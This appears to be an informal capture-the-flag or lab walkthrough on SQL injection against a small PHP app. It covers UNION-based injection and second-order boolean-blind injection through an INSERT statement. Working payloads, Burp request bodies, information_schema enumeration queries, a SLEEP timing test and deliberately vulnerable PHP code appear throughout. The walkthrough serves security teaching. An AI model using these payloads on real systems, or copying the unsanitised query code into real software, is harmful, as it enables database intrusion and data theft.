What is UNION anyways? 

inside SQL console: 
select 1,2,3,4;

This is a valid statement. 
select 1,2,3,4 union select 5,6,7,8;

This is not a valid SQL statement, the union portion needs to be selecting the same amount of columns.
select 1,2,3,4 union select 5,6,7;

This is a valid statement. Note that the character does not match as long as we have the same amount on both sides. 
select 1,2,3,4 union select 3,5,7,9;



Let's look at the origional query on list.php: 

SELECT * FROM users WHERE country='mexico';

The select * value is going to be the amount of columns 

select * from users;

In this case, we can see three columns.

SELECT * FROM users WHERE country='mexico' UNION SELECT 1,2,3-- -'
remember:      mexico' UNION SELECT 1,2,3-- -    is our user input 


The injected part UNION SELECT 1,2,3 is a valid SQL statement that creates a new row with three columns containing the values 1, 2, and 3.

SELECT * FROM users WHERE country='mexico' UNION SELECT 1,database(),3-- -'

The UNION command makes it do an additional select, on a new line.

In some cases, the additional hyphen at the end, as in "-- -", may be necessary to ensure that any trailing characters or syntax from the original query are properly commented out. 
This helps to avoid potential syntax errors that could arise if the original query includes certain characters or keywords immediately after the injection point. 
The trailing hyphen ensures that the injected code is executed correctly by ensuring that any remnants of the original query are treated as comments.

Okay, let's look at the home.php file 

INSERT INTO users (username, country) VALUES ('$name', '$country')

Which of these commands will work in terminal, and why? 
INSERT INTO users (username, country) VALUES ('bob3', 'mexico3'); union select 1,2,3; -- -', 'country_value')
INSERT INTO users (username, country) VALUES ('bob3', 'mexico3'); select 1,2,3; -- -', 'country_value')

*demo* 

The second command works. In order to use a UNION statement, there must be another SELECT statement earlier in the query. 

So, this user input is our injection:
mexico3'); select 1,2,3; -- -

However, this will fail inside burp when we send this post body data.

The injection you attempted in the INSERT statement seems to be causing an error when posted to the home.php script. 
This error occurs because the code is not expecting multiple queries to be executed in a single statement.

To successfully execute multiple queries in a single statement, the underlying database driver or API must support it and be properly configured. 
By default, the PHP MySQLi extension does not allow multiple queries in a single statement for security reasons.

So, no stacking queries in our injection. Let's think about another way we can attack this. 

DIVE DEEP, WE SWIMMING NOW, DON'T DROWN !!! 

Origional query: 
INSERT INTO users (username, country) VALUES ('joe', 'mexico')

We can set our payload to "mexico')-- -" although this doesn't change the outcome, it confirms that it is possibly injectable. 
INSERT INTO users (username, country) VALUES ('joe', 'mexico')-- -     ')

We can't STACK queries but we can use certain operators to cause unintentional code execution. The OR statement is perfect for this, as it's not stacking queries. 

INSERT INTO users (username, country) VALUES ('true_check_1', '' OR '2'='2     ')
burp: 
name=true_check_1&country=' OR '2'='2

show in the mysql gui: select * from users;
| 70 | true_check_1        | 1                |

2=2 is true, so it writes a 1 
'' OR '2'='2'
It chooses the OR value, which is true, so it wrote 1 to the database because 1 = true and 0 = false 

Doing it this way would also work: 
INSERT INTO users (username, country) VALUES ('true_check_2', '' OR '2'='2')-- -     ')

Now, let's write 
'' OR '2'='1'

which should cause it to be false, and write a 0 
burp: 
name=true_check_3&country=' OR '2'='1

gui: select * from users;
| 73 | true_check_3        | 0                |

We can see it wrote a 0 for false because 2=1 is a false statement. This is critical to remember for later. 

One more thing I always like to do is to try and have a sleep function work to confirm 100% that it's injectable: 
INSERT INTO users (username, country) VALUES ('joe', '' OR SLEEP(15))-- -     ')

Okay. This is where BOOLEAN injection can come into play! 

This payload exploits a boolean-based blind SQL injection vulnerability by performing ASCII comparison. 
It tries to extract information about the database name by checking if the ASCII value of the first character is greater than 97 (the ASCII value for 'a').
https://www.ascii-code.com/

INSERT INTO users (username, country) VALUES ('db97', '' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 97) -- -    ')

burp:
name=db97&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 97) -- -
*successful* 

mysql gui: 
select * from users;

We can see that db97 is set to 1, so our statement must be true! The database ascii value is greater than A 

Now let's try 122, which is Z. If this is also set FALSE, then we know it's GREATER than 97, but LESS THAN 122

INSERT INTO users (username, country) VALUES ('db97', '' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 122) -- -    ')

burp:
name=db122&country=' OR ASCII(SUBSTRING((SELECT database()),1,1)) > 122) -- -
*successful* 

mysql gui: 
select * from users;

| 74 | db97                | 1                |
| 75 | db122               | 0                |

So we know that the first letter of the database is between 97 and 122. 

Let's stop and think for a moment. If we did not have access to the MYSQL gui, how could we have known at 122 was false and 97 was true?
burp gives them same output for both!!!

This is referred to as a two step SQL injection because the output does not directly return the 0 or 1 to us.
home.php simply lets us know if it was able to write to the database, or not. It's not telling us if our results wrote a 1 or a 0 ! 

Let's look at the code for list.php:

  If a user submitted mexico for country on index.php, and then submits that request, home.php recieves that as a POST request from index.php 
  index.php code: <form action="home.php" method="post">
  
  
  home.php takes this value, 
  $country = $_POST['country'];
  
  and then redirects the user to list.php based on which country they entered (Location: headers are used for redirects!)
header('Location: list.php?location=' . $country);



list.php then knows our country based on the parameter 
  $country = $_GET['location'];

Then lists all the other players in our country! 
  $sql = "SELECT * FROM users WHERE country='$country'";

  (this is vulnable my itself, but we will talk about that later)

We can see on the mysql GUI that the 1s and 0s were being written to the country field.
Using list.php, we specify which countries to see by using the ?location= parameter 

If we set our parameter to 1, we can see if our earlier requests were true. 
?location=1
db97

we can see if our earlier requests were false:
  ?location=0
  db122

(open the two pages in two tabs to make it easier)

Okay, let's go back to what we were doing.
We know that the first letter of the database is "greater than" a, or ascii 97 and lower than z, or ascii 122 
Notice how I am strategically using the username here. 






mexico' UNION SELECT 1,2,3-- -
mexico' UNION SELECT 1,group_concat(table_name),3 from information_schema.tables where table_schema='users'-- -
mexico' UNION SELECT 1,group_concat(table_schema,0x3a,column_name),3 FROM information_schema.columns WHERE table_name = 'security'-- -
?location=mexico' UNION SELECT 1,country,3 from users.users-- -


CREATE TABLE users (
  id INT NOT NULL AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(255) NOT NULL,
  country VARCHAR(255) DEFAULT NULL
);

INSERT INTO users (username, country) VALUES ('flag', '4n0th3r1nj3ct1on');